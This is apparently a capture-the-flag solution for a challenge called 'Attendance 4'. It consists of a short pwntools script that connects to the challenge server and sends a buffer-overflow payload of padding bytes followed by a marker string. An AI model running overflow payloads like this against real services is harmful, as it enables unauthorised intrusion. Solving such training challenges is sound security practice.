# Attendance 4 - 27 Sep [1 points] (41 solves)
```python
from pwn import *
context.log_level = 'CRITICAL'
p = remote("chal.firebird.sh",35018)
payload = b"A" * 80 + b"B" * 8 + b"UwU\x00"
p.sendline(payload)

print(p.recvall().decode())
```